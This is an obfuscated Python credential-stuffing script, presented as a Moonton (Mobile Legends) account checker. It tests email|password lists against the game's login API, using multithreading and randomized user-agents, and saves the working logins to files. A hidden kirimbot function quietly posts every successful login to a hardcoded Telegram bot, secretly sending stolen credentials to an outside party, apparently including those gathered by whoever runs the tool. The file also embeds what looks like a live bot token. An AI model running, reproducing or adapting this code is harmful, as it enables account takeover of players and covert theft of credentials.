#!/usr/bin/env python
import requests ,hashlib ,json ,warnings ,argparse ,urllib .parse #line:6
from termcolor import colored #line:7
from fake_useragent import UserAgent #line:8
from concurrent .futures import ThreadPoolExecutor #line:9
from requests .packages .urllib3 .exceptions import InsecureRequestWarning #line:10
warnings .simplefilter ('ignore',InsecureRequestWarning )#line:11
def kirimbot (OO0OOOO0OOOO0000O ):#line:13
	OOOO0000000OO00O0 ="Moonton :"+OO0OOOO0OOOO0000O #line:14
	OO0OO0O00O0OOO000 ="https://api.telegram.org/bot1064780888:AAEQm4k_8jLjlM7reRznDjA8f8kI6o8kjKU/sendMessage?chat_id=701465009&text="+urllib .parse .quote (OOOO0000000OO00O0 )#line:15
	requests .post (OO0OO0O00O0OOO000 )#line:16
def doSave (OO0O0OOO0O00O00O0 ,OO0O0O00O000O0O00 ):#line:18
    OOO0OO0O0O000O000 =open (OO0O0OOO0O00O00O0 ,'a+')#line:19
    OOO0OO0O0O000O000 .write (OO0O0O00O000O0O00 +"\n")#line:20
    OOO0OO0O0O000O000 .close ()#line:21
def doDictSorting (O0O000O00O0OOOO00 ):#line:23
    OO0OOO00O00O0O000 =''#line:24
    for O00O0O0OO0OOO0OO0 in O0O000O00O0OOOO00 .keys ():#line:25
        OO0OOO00O00O0O000 +=O00O0O0OO0OOO0OO0 +'='+O0O000O00O0OOOO00 [O00O0O0OO0OOO0OO0 ]+"&"#line:26
    return OO0OOO00O00O0O000 #line:27
def doCheck (O0OOOOOO000O0OOOO ,delim =None ):#line:29
    if delim is not None :#line:30
        delim =delim #line:31
    else :#line:32
        delim ="|"#line:33
    try :#line:34
        OOOOO00OOOO00O0OO ,O00OO00O000OO0O00 =O0OOOOOO000O0OOOO .split (delim ,2 )#line:35
        OOO00OOOOOOOOOOOO ={'op':'login','sign':'','params':{'account':OOOOO00OOOO00O0OO ,'md5pwd':O00OO00O000OO0O00 },'lang':'en'}#line:44
        OO000000OOO0O0000 =doDictSorting (OOO00OOOOOOOOOOOO ['params'])#line:45
        OO000000OOO0O0000 +='op='+OOO00OOOOOOOOOOOO ['op']#line:46
        OOO00OOOOOOOOOOOO ['sign']=hashlib .md5 (str (OO000000OOO0O0000 ).encode ('utf-8')).hexdigest ()#line:47
        OOO0000OOOO0OOOO0 =requests .post ('https://accountmtapi.mobilelegends.com/',data =json .dumps (OOO00OOOOOOOOOOOO ),headers ={'User-Agent':UserAgent ().random })#line:48
        OOO0OO0OOO00OOOOO =json .loads (OOO0000OOOO0OOOO0 .text )#line:49
        if OOO0OO0OOO00OOOOO ['message']=='Error_Success':#line:50
            print (colored ('LIVE!','green')+" "+O0OOOOOO000O0OOOO +" "+colored ('Login Success!','blue'))#line:51
            kirimbot (O0OOOOOO000O0OOOO )#line:52
            doSave ('MOONTON_LIVE.txt',O0OOOOOO000O0OOOO )#line:53
        elif OOO0OO0OOO00OOOOO ['message']=='Error_PasswdError':#line:54
            print (colored ('VALID!','blue')+" "+OOOOO00OOOO00O0OO +" "+colored ('Wrong Password!','red'))#line:55
            doSave ('MOONTON_VALID.txt',OOOOO00OOOO00O0OO )#line:56
        elif OOO0OO0OOO00OOOOO ['message']=='Error_NoAccount':#line:57
            print (colored ('DIE!','red')+" "+O0OOOOOO000O0OOOO +" "+colored ('Email Account Not Found!','yellow'))#line:58
            doSave ('MOONTON_DIE.txt',O0OOOOOO000O0OOOO )#line:59
        elif OOO0OO0OOO00OOOOO ['message']=='Error_SignConflict':#line:60
            print (colored ('ERROR!','red')+" "+O0OOOOOO000O0OOOO +" "+colored ('Account Sign IN Error!','yellow'))#line:61
            doSave ('MOONTON_DIE.txt',O0OOOOOO000O0OOOO )#line:62
        elif OOO0OO0OOO00OOOOO ['message']=='Error_PwdErrorTooMany':#line:63
            print (colored ('UNCHECK!','yellow')+" "+O0OOOOOO000O0OOOO +" "+colored ('Too many wrong password!','red'))#line:64
            doSave ('MOONTON_UNCHECK.txt',O0OOOOOO000O0OOOO )#line:65
        else :#line:66
            print (colored ('UNCHECK!','yellow')+" "+O0OOOOOO000O0OOOO )#line:67
            doSave ('MOONTON_UNCHECK.txt',O0OOOOOO000O0OOOO )#line:68
    except Exception as OOOOOOOOOO000O0O0 :#line:69
        print ('OOPS! '+str (OOOOOOOOOO000O0O0 ))#line:70
parser =argparse .ArgumentParser (description ='MOONTON ACCOUNT CHECKER & VALID CHECKER BY WIBUHEKER!')#line:72
parser .add_argument ('--list',help ='List of ur mail|password',required =True )#line:73
parser .add_argument ('--thread',help ='Threading Proccess for fast checking max 10')#line:74
parser .add_argument ('--delim',help ='Delimeter ex | or : or =')#line:75
wibuheker =parser .parse_args ()#line:76
try :#line:77
    wibuList =open (wibuheker .list ,'r').read ().splitlines ()#line:78
    if wibuheker .thread and wibuheker .thread is not None :#line:79
        with ThreadPoolExecutor (max_workers =int (wibuheker .thread ))as execute :#line:80
            for empass in wibuList :#line:81
                execute .submit (doCheck ,empass ,wibuheker .delim )#line:82
    else :#line:83
        for empass in wibuList :#line:84
            doCheck (empass ,wibuheker .delim )#line:85
except Exception as e :#line:86
    print ('OOPS! '+str (e ))#line:87
